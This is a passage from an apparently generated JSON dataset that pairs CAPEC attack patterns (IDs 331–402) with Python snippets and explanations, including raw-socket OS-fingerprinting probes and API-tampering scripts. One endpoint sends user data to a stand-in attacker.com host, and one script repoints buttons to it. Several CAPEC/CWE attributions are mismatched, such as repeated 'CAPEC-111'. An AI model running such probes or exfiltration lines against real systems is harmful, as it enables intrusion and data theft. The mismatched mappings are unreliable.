        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\nip_header += b'\\x40\\x01\\x00\\x00'  # TTL, Protocol | Header Checksum\nip_header += b'\\x7f\\x00\\x00\\x01'  # Source IP Address\nip_header += b'\\x7f\\x00\\x00\\x01'  # Destination IP Address\n\n# ICMP header fields\nicmp_header = b'\\x08\\x00\\x4d\\x62'  # Type, Code | Checksum\nicmp_header += b'\\x00\\x01\\x00\\x01'  # Identifier, Sequence Number\n\n# Construct the packet\npacket = ip_header + icmp_header\n\n# Send the packet\nsock.sendto(packet, ('127.0.0.1', 0))\n\n# Receive the response\nresponse, _ = sock.recvfrom(1024)\n\n# Extract the IP total length field from the response\nip_total_length = response[2:4]\n\nprint(f'Received IP Total Length: {int.from_bytes(ip_total_length, byteorder=\"big\")}')",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP IP Total Length Field Probe' attack. It creates a raw socket to send a crafted ICMP packet to a target machine (localhost in this case). The packet includes an IP header and an ICMP header. The code then waits for a response and extracts the IP total length field from the echoed 'Port Unreachable' error message. This field can be used to identify the operating system based on its response signature. The code also highlights CWE-204 (Observable Response Discrepancy) by showing how different responses can reveal internal state information, and CWE-130 (Improper Handling of Length Parameter Inconsistency) by manipulating the length fields in the headers."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n\n# Set the IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service, Total Length\nip_header += b'\\xab\\xcd'  # Identification field (ID)\nip_header += b'\\x00\\x00'  # Flags, Fragment Offset\nip_header += b'\\x40'  # TTL\nip_header += b'\\x11'  # Protocol (UDP)\nip_header += b'\\x00\\x00'  # Header Checksum (to be filled by kernel)\nip_header += socket.inet_aton('192.168.1.1')  # Source IP\nip_header += socket.inet_aton('192.168.1.2')  # Destination IP\n\n# Set the UDP header fields\nudp_header = b'\\x00\\x35'  # Source Port\nudp_header += b'\\x00\\x00'  # Destination Port (closed port)\nudp_header += b'\\x00\\x08'  # Length\nudp_header += b'\\x00\\x00'  # Checksum\n\n# Combine headers to form the packet\npacket = ip_header + udp_header\n\n# Send the packet\nsock.sendto(packet, ('192.168.1.2', 0))\n\n# Receive the ICMP error message\nresponse = sock.recv(1024)\n\n# Print the response for analysis\nprint(response)",
        "description": "This Python code snippet demonstrates the concept of the CAPEC 'ICMP IP 'ID' Field Error Message Probe'. It creates a raw socket and constructs a UDP datagram with a specific IP identification field (ID). The packet is sent to a closed port on a target machine. The code then listens for an ICMP error message in response. By analyzing the response, an attacker can fingerprint the target OS based on how the IP ID field is echoed back. This code also touches on related CWEs, such as 'Observable Response Discrepancy' (CWE-204) and 'Externally-Generated Error Message Containing Sensitive Information' (CWE-211), by exploiting the way the system handles and responds to the crafted packet."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated event hosting endpoint\n@app.route('/host_event', methods=['POST'])\ndef host_event():\n    event_data = request.json\n    # Log user data in cleartext (CWE-319)\n    with open('user_data.log', 'a') as log_file:\n        log_file.write(f\"UserID: {event_data['user_id']}, Username: {event_data['username']}\\n\")\n    return jsonify({'status': 'Event hosted successfully'})\n\n# Simulated event participation endpoint\n@app.route('/participate_event', methods=['POST'])\ndef participate_event():\n    user_data = request.json\n    # Transmit sensitive data in cleartext (CWE-319)\n    response = requests.post('http://attacker.com/log', json=user_data)\n    return jsonify({'status': 'Participation recorded'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has two endpoints: one for hosting an event and another for participating in an event. The 'host_event' endpoint logs user data (user_id and username) in cleartext to a file, representing CWE-319 (Cleartext Transmission of Sensitive Information). The 'participate_event' endpoint sends user data in cleartext to an external server, simulating an attacker-controlled endpoint. This represents the CAPEC scenario where an adversary can harvest information via API event monitoring. The code highlights the vulnerabilities of missing encryption (CWE-311), cleartext transmission (CWE-319), and unprotected primary channels (CWE-419)."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# Client-side code that sends sensitive data to the server\nsensitive_data = {\n    'username': 'user123',\n    'password': 'pass123'\n}\n\n# Sending data without encryption (CWE-311)\nresponse = requests.post('http://example.com/api/login', json=sensitive_data)\n\n# Server-side code that trusts client-side data without proper validation (CWE-602, CWE-345, CWE-346)\ndef process_login(data):\n    # Assume data is immutable and trusted (CWE-471)\n    username = data['username']\n    password = data['password']\n    \n    # Insufficient verification of data authenticity (CWE-345)\n    if username == 'admin' and password == 'admin123':\n        return 'Admin access granted'\n    else:\n        return 'Access denied'\n\n# Simulating an attacker manipulating the data in transit (CAPEC-94)\nmanipulated_data = sensitive_data.copy()\nmanipulated_data['username'] = 'admin'\nmanipulated_data['password'] = 'admin123'\n\n# Server processes the manipulated data\nresult = process_login(manipulated_data)\nprint(result)",
        "description": "This code snippet demonstrates a scenario where an attacker can manipulate API messages between a client and a server. The client sends sensitive data (username and password) to the server without encryption (CWE-311). The server processes this data without proper validation (CWE-602, CWE-345, CWE-346), assuming the data is immutable and trusted (CWE-471). An attacker intercepts and modifies the data in transit (CAPEC-94), changing the username and password to gain unauthorized access. This highlights the importance of encrypting sensitive data, validating data authenticity, and not relying on client-side enforcement of server-side security."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import requests\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-471: Modification of Assumed-Immutable Data\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\n# Simulated API endpoint for a transaction\napi_endpoint = 'http://example.com/api/transaction'\n\n# Original transaction data\ntransaction_data = {\n    'sender': 'user123',\n    'receiver': 'user456',\n    'amount': 100,\n    'currency': 'USD'\n}\n\n# Attacker intercepts and modifies the transaction data\n# CWE-471: Modification of Assumed-Immutable Data\ntransaction_data['amount'] = 1000  # Changing the amount\ntransaction_data['receiver'] = 'attacker789'  # Changing the receiver\n\n# Sending the modified transaction data\nresponse = requests.post(api_endpoint, json=transaction_data)\n\n# CWE-345 and CWE-346: Insufficient Verification of Data Authenticity and Origin Validation Error\nif response.status_code == 200:\n    print('Transaction successful')\nelse:\n    print('Transaction failed')",
        "description": "This Python code snippet demonstrates a scenario where an attacker intercepts and modifies transaction data before it is sent to a server. The code highlights several vulnerabilities: missing encryption of sensitive data (CWE-311), insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), modification of assumed-immutable data (CWE-471), and client-side enforcement of server-side security (CWE-602). The attacker changes the transaction amount and receiver, then sends the modified data to the server, which fails to verify the authenticity and origin of the data, leading to a successful fraudulent transaction."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n@app.route('/redirect', methods=['GET'])\ndef redirect_user():\n    target = request.args.get('target')\n    if not target:\n        return 'No target specified', 400\n    # CWE-346: Origin Validation Error\n    if 'trusted.com' not in target:\n        return 'Invalid target', 400\n    return redirect(target)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n@app.route('/profile', methods=['POST'])\ndef update_profile():\n    data = request.json\n    # Assume the client has validated this data\n    user_profile = {\n        'name': data['name'],\n        'email': data['email'],\n        'profile_pic': data['profile_pic']  # CWE-471: Modification of Assumed-Immutable Data (MAID)\n    }\n    return 'Profile updated', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that embodies the main idea of CAPEC-111: Application API Navigation Remapping. The '/redirect' endpoint allows users to be redirected to a target URL specified in the query parameters. However, it insufficiently verifies the authenticity and origin of the target URL (CWE-345 and CWE-346), potentially allowing an attacker to redirect users to malicious sites. The '/profile' endpoint updates user profile information based on JSON data sent by the client. It assumes the client has validated the data, which is a form of client-side enforcement of server-side security (CWE-602). Additionally, it allows modification of assumed-immutable data (CWE-471) such as the profile picture URL, which could be exploited to redirect users to attacker-controlled content."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import requests\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\n# Simulate a client-side request to a server\nresponse = requests.get('http://example.com/data')\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# Attacker intercepts and modifies the response data\nmalicious_content = response.text.replace('original_content', 'malicious_content')\n\n# Client processes the modified data without verifying its authenticity\nprint(malicious_content)\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker intercepts and modifies data between a client and a server, embodying the CAPEC 'Navigation Remapping To Propagate Malicious Content'. The code fetches data from a server using an HTTP GET request. An attacker then modifies the assumed-immutable data (CWE-471) in the response. The client processes this modified data without verifying its authenticity (CWE-345, CWE-346), and without encrypting sensitive data (CWE-311). Additionally, the server relies on the client to enforce security mechanisms (CWE-602), making it vulnerable to such attacks."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import requests\n\n# Simulate a client-side button hijacking attack\nclass ButtonHijacker:\n    def __init__(self, api_url):\n        self.api_url = api_url\n\n    def get_buttons(self):\n        response = requests.get(self.api_url)\n        if response.status_code == 200:\n            return response.json().get('buttons', [])\n        return []\n\n    def hijack_buttons(self, buttons):\n        for button in buttons:\n            # CWE-471: Modification of Assumed-Immutable Data\n            button['url'] = 'http://attacker.com/malicious'\n        return buttons\n\n    def send_hijacked_buttons(self, hijacked_buttons):\n        # CWE-602: Client-Side Enforcement of Server-Side Security\n        # CWE-311: Missing Encryption of Sensitive Data\n        requests.post(self.api_url, json={'buttons': hijacked_buttons})\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\napi_url = 'http://vulnerable-api.com/get_buttons'\nhijacker = ButtonHijacker(api_url)\nbuttons = hijacker.get_buttons()\nhijacked_buttons = hijacker.hijack_buttons(buttons)\nhijacker.send_hijacked_buttons(hijacked_buttons)\n",
        "description": "This Python code snippet demonstrates a client-side button hijacking attack. The `ButtonHijacker` class interacts with a vulnerable API to retrieve button data, modify the button URLs to point to an attacker's site, and then send the modified buttons back to the server. The code highlights several vulnerabilities: \n1. CWE-471: The button URLs are assumed to be immutable but are modified by the attacker.\n2. CWE-345 and CWE-346: The API does not verify the authenticity or origin of the data, allowing the attacker to send malicious data.\n3. CWE-602: The server relies on the client to enforce security, which is bypassed by the attacker.\n4. CWE-311: Sensitive data (button URLs) is transmitted without encryption, making it easier for the attacker to intercept and modify."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import requests\n\n# Vulnerable API endpoint\napi_url = 'http://example.com/api/data'\n\n# Attacker intercepts and modifies the request\noriginal_request = {\n    'user_id': '12345',\n    'auth_token': 'valid_token'\n}\n\n# Attacker modifies the request to spoof content\nmodified_request = original_request.copy()\nmodified_request['user_id'] = '67890'\n\n# Send the modified request to the server\nresponse = requests.post(api_url, json=modified_request)\n\n# Print the response from the server\nprint(response.text)",
        "description": "This Python code snippet demonstrates a basic example of 'Content Spoofing Via Application API Manipulation' (CAPEC-111). The code uses the 'requests' library to send a POST request to a vulnerable API endpoint. The attacker intercepts the original request and modifies the 'user_id' field to spoof the content. This manipulation can lead to various attacks, such as unauthorized access or deceptive content delivery. The code highlights the lack of integrity checks (CWE-353) and the reliance on client-side enforcement of security (CWE-602), making it possible for an attacker to alter the request and potentially bypass authentication mechanisms (CWE-603, CWE-290)."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import os\nimport time\n\nclass PhysicalSecurityBypass:\n    def __init__(self, lock_status=True, alarm_status=True):\n        self.lock_status = lock_status\n        self.alarm_status = alarm_status\n\n    def bypass_lock(self):\n        # Simulate bypassing the lock\n        self.lock_status = False\n        print('Lock bypassed.')\n\n    def disable_alarm(self):\n        # Simulate disabling the alarm\n        self.alarm_status = False\n        print('Alarm disabled.')\n\n    def access_sensitive_area(self):\n        if not self.lock_status and not self.alarm_status:\n            print('Accessing sensitive area...')\n            # Simulate accessing sensitive information\n            sensitive_info = 'Sensitive Data'\n            print(f'Accessed: {sensitive_info}')\n        else:\n            print('Access denied. Lock or alarm is active.')\n\n# Example usage\nbypass = PhysicalSecurityBypass()\nbypass.bypass_lock()\ntime.sleep(1)  # Simulate time taken to bypass lock\nbypass.disable_alarm()\ntime.sleep(1)  # Simulate time taken to disable alarm\nbypass.access_sensitive_area()",
        "description": "This Python code snippet simulates the process of bypassing physical security mechanisms, such as locks and alarms, to access a sensitive area. The `PhysicalSecurityBypass` class represents a system with a lock and an alarm. The `bypass_lock` method simulates bypassing the lock, and the `disable_alarm` method simulates disabling the alarm. The `access_sensitive_area` method checks if both the lock and alarm are bypassed before granting access to sensitive information. This code embodies the main idea of CAPEC-Physical Security Bypass by demonstrating how an attacker might sequentially disable security mechanisms to gain unauthorized access. The related CWEs are represented by the lack of proper protection mechanisms in the simulated system."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock:\n    def __init__(self, lock_bit=True):\n        self.lock_bit = lock_bit\n        self.locked = True\n\n    def unlock(self):\n        if not self.lock_bit:\n            self.locked = False\n        else:\n            print('Lock bit is set, cannot unlock.')\n\n    def force_unlock(self):\n        # Bypassing the lock bit check\n        self.locked = False\n        print('Lock has been forcefully unlocked!')\n\n# Example usage\nlock = PhysicalLock()\nprint(f'Initial lock state: {lock.locked}')\nlock.unlock()  # Attempt to unlock normally\nprint(f'Lock state after normal unlock attempt: {lock.locked}')\nlock.force_unlock()  # Forcefully unlock, bypassing the lock bit\nprint(f'Lock state after force unlock: {lock.locked}')",
        "description": "This Python code snippet represents the concept of bypassing physical locks by simulating a lock mechanism with a 'lock_bit' that is intended to prevent unauthorized unlocking. The 'unlock' method respects the 'lock_bit' and does not unlock if the bit is set, simulating a proper lock mechanism. However, the 'force_unlock' method bypasses this check and forcefully unlocks the lock, representing an attacker's ability to bypass physical security measures. This embodies the CAPEC idea of bypassing physical locks and highlights related weaknesses such as improper physical access control and the ability to override locks."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "class Lock:\n    def __init__(self):\n        self.locked = True\n        self.lock_bit = 1  # Represents a lock bit that should prevent access\n\n    def bump_key_attack(self):\n        # Simulate the bump key attack by temporarily setting lock_bit to 0\n        self.lock_bit = 0\n        if self.lock_bit == 0:\n            self.locked = False  # Lock is opened\n        self.lock_bit = 1  # Reset lock bit to its original state\n\n    def is_locked(self):\n        return self.locked\n\n# Example usage\nlock = Lock()\nprint(f\"Lock status before attack: {'Locked' if lock.is_locked() else 'Unlocked'}\")\nlock.bump_key_attack()\nprint(f\"Lock status after attack: {'Locked' if lock.is_locked() else 'Unlocked'}\")",
        "description": "This Python code snippet simulates a lock bumping attack. The `Lock` class represents a lock with a `lock_bit` that is intended to prevent unauthorized access. The `bump_key_attack` method simulates the bump key attack by temporarily setting the `lock_bit` to 0, which allows the lock to be opened (i.e., `self.locked` is set to False). After the attack, the `lock_bit` is reset to its original state. The `is_locked` method checks the current status of the lock. This code embodies the main idea of the CAPEC by demonstrating how a lock can be bypassed using a bump key, and it also touches on related CWEs by showing how improper prevention of lock bit modification can lead to security vulnerabilities."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n\n    def lock(self):\n        if not self.locked:\n            self.locked = True\n        else:\n            raise Exception('Resource already locked')\n\n    def unlock(self):\n        if self.locked:\n            self.locked = False\n        else:\n            raise Exception('Unlock of a resource that is not locked')\n\nclass Resource:\n    def __init__(self):\n        self.lock = Lock()\n        self.data = 'Sensitive Data'\n\n    def access(self):\n        if not self.lock.locked:\n            return self.data\n        else:\n            raise Exception('Resource is locked')\n\n# Simulate lock picking by bypassing the lock mechanism\nresource = Resource()\n\n# Bypassing the lock\nresource.lock.locked = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n# Accessing the resource without proper unlocking\nprint(resource.access())  # Should print 'Sensitive Data'\n\n# Deadlock example\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\ndef thread1():\n    with lock1:\n        with lock2:\n            print('Thread 1 acquired both locks')\n\ndef thread2():\n    with lock2:\n        with lock1:\n            print('Thread 2 acquired both locks')\n\n# Creating threads\nt1 = threading.Thread(target=thread1)\n\nt2 = threading.Thread(target=thread2)\n\n# Starting threads\n# This can lead to a deadlock situation\n# t1.start()\n# t2.start()",
        "description": "This Python code snippet demonstrates the concept of 'Lock Picking' by simulating a scenario where a lock mechanism is bypassed to access a protected resource. The `Lock` class represents a simple lock mechanism, and the `Resource` class uses this lock to protect sensitive data. The lock is improperly modified (CWE-1231) to simulate lock picking, allowing access to the resource without proper unlocking. Additionally, the code includes a deadlock example (CWE-833) using threading, where two threads attempt to acquire two locks in different orders, potentially leading to a deadlock situation."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n        self.lock = threading.Lock()\n\n    def acquire(self):\n        with self.lock:\n            if not self.locked:\n                self.locked = True\n                print('Lock acquired')\n            else:\n                print('Lock already acquired')\n\n    def release(self):\n        with self.lock:\n            if self.locked:\n                self.locked = False\n                print('Lock released')\n            else:\n                print('Lock already released')\n\n    def force_unlock(self):\n        with self.lock:\n            self.locked = False\n            print('Lock forcibly unlocked')\n\n# Simulating improper lock behavior after power state transition\nlock = Lock()\nlock.acquire()\n# Simulate power state transition\nlock.force_unlock()  # Improperly forcing the lock to unlock\nlock.acquire()  # Re-acquiring the lock after improper unlock",
        "description": "This Python code snippet simulates a lock mechanism using threading to represent the concept of a physical lock being forced open, akin to using a Snap Gun. The `Lock` class has methods to acquire and release the lock properly, but also includes a `force_unlock` method that forcibly unlocks it, representing the vulnerability. This method bypasses the normal locking mechanism, similar to how a Snap Gun forces a lock open. The code also demonstrates improper lock behavior after a simulated power state transition, where the lock is forcibly unlocked and then re-acquired, highlighting CWE-1232 (Improper Lock Behavior After Power State Transition)."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\n# Simulate a hard-coded cryptographic key (CWE-321)\nHARD_CODED_KEY = 'hardcodedkey123'\n\n# Simulate a broken cryptographic algorithm (CWE-327)\ndef broken_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate the generation of an RFID card using the broken algorithm\ndef generate_rfid_card(user_id):\n    # Combine user ID with hard-coded key\n    data = user_id + HARD_CODED_KEY\n    # Generate RFID card data using broken hash function\n    rfid_data = broken_hash(data)\n    return rfid_data\n\n# Example usage\nuser_id = 'user123'\nrfid_card = generate_rfid_card(user_id)\nprint(f'Generated RFID card data: {rfid_card}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of generating RFID card data. It uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (MD5, CWE-327) to generate the RFID card data. The function `generate_rfid_card` combines a user ID with the hard-coded key and then hashes the result using the broken MD5 algorithm. This approach embodies the main idea of the CAPEC 'Bypassing Electronic Locks and Access Controls' by illustrating how an attacker could exploit weak cryptographic practices to generate or clone RFID cards, thereby bypassing access controls."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing a hashed password\nstored_password_hash = hashlib.md5('securepassword'.encode()).hexdigest()\n\n# Simulate an attacker capturing and replaying the hashed password\ncaptured_hash = stored_password_hash\n\n# Authentication function\ndef authenticate(input_hash):\n    if input_hash == stored_password_hash:\n        return 'Authentication Successful'\n    else:\n        return 'Authentication Failed'\n\n# Attacker replays the captured hash\nresult = authenticate(captured_hash)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-294: Authentication Bypass by Capture-replay. The code simulates a scenario where a password is hashed using a broken or risky cryptographic algorithm (MD5, CWE-327) and stored. An attacker captures the hashed password and replays it to the authentication function, successfully bypassing authentication. This highlights the risk of using weak cryptographic algorithms and the potential for capture-replay attacks, leading to authentication bypass (CWE-290)."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass MagStripeCard:\n    def __init__(self, card_number, expiration_date, cvv):\n        self.card_number = card_number\n        self.expiration_date = expiration_date\n        self.cvv = cvv\n\n    def clone(self):\n        return copy.deepcopy(self)\n\n# Example usage\noriginal_card = MagStripeCard('1234-5678-9012-3456', '12/25', '123')\ncloned_card = original_card.clone()\n\nprint(f'Original Card: {original_card.card_number}, {original_card.expiration_date}, {original_card.cvv}')\nprint(f'Cloned Card: {cloned_card.card_number}, {cloned_card.expiration_date}, {cloned_card.cvv}')",
        "description": "This Python code snippet defines a class `MagStripeCard` that represents a magnetic stripe card containing sensitive information such as card number, expiration date, and CVV. The class includes a `clone` method that uses the `copy.deepcopy` function to create an exact duplicate of the card object. This demonstrates the vulnerability described in the CAPEC, where an attacker can easily clone a magnetic stripe card to gain unauthorized access. The use of the `copy` module to clone the class containing sensitive information aligns with CWE-498 (Cloneable Class Containing Sensitive Information). The example usage shows how an original card can be cloned, highlighting the ease with which an attacker could duplicate the card's data."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import itertools\nimport string\n\n# Simulate a magnetic strip card data\ncard_data = '1234567890123456'\n\n# Hard-coded cryptographic key (CWE-321)\ncryptographic_key = 'hardcodedkey'\n\n# Function to simulate encryption (CWE-327)\ndef encrypt(data, key):\n    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, itertools.cycle(key)))\n\n# Function to simulate decryption\ndef decrypt(data, key):\n    return encrypt(data, key)  # XOR is symmetric\n\n# Brute force attack simulation (CWE-307)\ndef brute_force_attack(encrypted_data, key):\n    for attempt in itertools.product(string.digits, repeat=len(card_data)):\n        attempt_str = ''.join(attempt)\n        if decrypt(encrypted_data, key) == attempt_str:\n            return attempt_str\n    return None\n\n# Encrypt the card data\nencrypted_data = encrypt(card_data, cryptographic_key)\n\n# Perform brute force attack\nrecovered_data = brute_force_attack(encrypted_data, cryptographic_key)\n\nprint(f'Recovered Data: {recovered_data}')\n",
        "description": "This Python code snippet simulates a brute force attack on magnetic strip card data, embodying the main idea of CAPEC-111. The code includes several weaknesses: it uses a hard-coded cryptographic key (CWE-321), employs a simple XOR-based encryption which is considered risky (CWE-327), and demonstrates a brute force attack due to improper restriction of excessive authentication attempts (CWE-307). The code encrypts the card data using a hard-coded key, then attempts to recover the original data by trying all possible combinations of digits, simulating a brute force attack."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import random\n\nclass RFIDChip:\n    def __init__(self, identifier):\n        self.identifier = identifier\n\n    def get_signal(self):\n        # Simulate signal with identifier\n        return f'SIGNAL-{self.identifier}'\n\nclass RFIDCloner:\n    def clone(self, chip):\n        # Capture the signal from the original chip\n        captured_signal = chip.get_signal()\n        # Extract the identifier from the signal\n        cloned_identifier = captured_signal.split('-')[1]\n        # Create a new chip with the same identifier\n        return RFIDChip(cloned_identifier)\n\n# Simulate the process\noriginal_chip = RFIDChip(random.randint(1000, 9999))\ncloner = RFIDCloner()\ncloned_chip = cloner.clone(original_chip)\n\nprint(f'Original Chip Signal: {original_chip.get_signal()}')\nprint(f'Cloned Chip Signal: {cloned_chip.get_signal()}')",
        "description": "This Python code snippet demonstrates the concept of cloning RFID cards or chips, as described in the CAPEC. The `RFIDChip` class simulates an RFID chip with a unique identifier. The `RFIDCloner` class captures the signal from an original RFID chip, extracts the identifier, and creates a new chip with the same identifier, effectively cloning the original chip. This process highlights the vulnerability of RFID systems to cloning attacks, where an attacker can duplicate the RFID signal and gain unauthorized access. The code also touches on related CWEs, such as insecure security identifier mechanisms and the use of duplicate identifiers."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip:\n    def __init__(self, id):\n        self.id = id\n        self.active = True\n        self.debug_mode = False\n        self.error_injection_allowed = False\n        self.alerts_enabled = True\n\n    def deactivate_chip(self):\n        if self.debug_mode:\n            self.active = False\n            print(f'RFID Chip {self.id} deactivated.')\n        else:\n            print('Access Denied: Debug mode not enabled.')\n\n    def inject_error(self):\n        if self.error_injection_allowed:\n            self.active = False\n            print(f'Error injected into RFID Chip {self.id}. Chip deactivated.')\n        else:\n            print('Access Denied: Error injection not allowed.')\n\n    def disable_alerts(self):\n        self.alerts_enabled = False\n        print(f'Alerts disabled for RFID Chip {self.id}.')\n\n# Example usage\nchip = RFIDChip(id=1234)\nchip.debug_mode = True  # CWE-1191: Improper access control\nchip.deactivate_chip()  # Deactivates the chip\n\nchip.error_injection_allowed = True  # CWE-1334: Unauthorized error injection\nchip.inject_error()  # Injects error and deactivates the chip\n\nchip.disable_alerts()  # CWE-1320: Disables alerts",
        "description": "This Python code snippet represents an RFID chip class that can be deactivated or have errors injected into it, embodying the main idea of CAPEC-119: 'RFID Chip Deactivation or Destruction'. The class includes methods to deactivate the chip, inject errors, and disable alerts. The code demonstrates vulnerabilities related to improper access control (CWE-1191), unauthorized error injection (CWE-1334), and improper protection for outbound error messages and alert signals (CWE-1320). By enabling debug mode or error injection, an attacker can deactivate the RFID chip, rendering it unresponsive, which aligns with the described attack pattern."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate improper physical access control\nclass HardwareDevice:\n    def __init__(self):\n        self.secure_data = 'Sensitive Information'\n        self.debug_mode = False\n\n    def enable_debug_mode(self):\n        # CWE-1313: Allow activation of debug logic at runtime\n        self.debug_mode = True\n        print('Debug mode enabled')\n\n    def read_secure_data(self):\n        if self.debug_mode:\n            # CWE-1300: Expose sensitive information via side channels\n            print(f'Accessing secure data: {self.secure_data}')\n        else:\n            print('Access denied')\n\n# Simulate an attacker gaining physical access\nattacker_access = True\n\nif attacker_access:\n    device = HardwareDevice()\n    # CWE-1263: Improper physical access control\n    device.enable_debug_mode()\n    # CWE-1256: Improper restriction of software interfaces to hardware features\n    device.read_secure_data()\n\n# Simulate voltage and clock glitch attack\ntry:\n    # CWE-1247: Improper protection against voltage and clock glitches\n    for i in range(5):\n        print('Glitching...')\n        time.sleep(0.5)\n        if i == 3:\n            raise Exception('Voltage glitch detected')\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet simulates a scenario where an attacker gains physical access to a hardware device and exploits various vulnerabilities to compromise the system's integrity. The `HardwareDevice` class represents a device with sensitive information and a debug mode that can be improperly activated at runtime (CWE-1313). The attacker enables the debug mode and accesses secure data, demonstrating improper physical access control (CWE-1263) and improper restriction of software interfaces to hardware features (CWE-1256). Additionally, the code simulates a voltage and clock glitch attack (CWE-1247) to highlight the lack of protection against such physical attacks. The overall idea represents the CAPEC of physically hacking hardware by exploiting weaknesses in access control and hardware protection mechanisms."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "class ATADrive:\n    def __init__(self, password):\n        self.password = password\n        self.locked = True\n\n    def unlock(self, password):\n        if password == self.password:\n            self.locked = False\n        else:\n            raise ValueError(\"Incorrect password\")\n\n    def update_password(self, new_password):\n        # Vulnerability: Allows password update without checking if the drive is unlocked\n        self.password = new_password\n\n# Example usage\nata_drive = ATADrive(\"securepassword\")\ntry:\n    ata_drive.unlock(\"wrongpassword\")\nexcept ValueError as e:\n    print(e)\n\n# Vulnerability exploitation: Update password without unlocking\nata_drive.update_password(\"newpassword\")\n\n# Now the drive can be unlocked with the new password\nata_drive.unlock(\"newpassword\")\nprint(\"Drive unlocked:\", not ata_drive.locked)",
        "description": "This Python code snippet represents a simplified model of an ATA drive with a password protection mechanism. The `ATADrive` class has methods to unlock the drive and update the password. The vulnerability lies in the `update_password` method, which allows the password to be changed without verifying if the drive is currently unlocked. This mirrors the CAPEC scenario where an adversary can bypass ATA password security by exploiting improper authorization (CWE-285) and insufficient granularity of access control (CWE-1220). The code demonstrates how an attacker can update the password without proper authentication, thereby gaining unauthorized access to the drive."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
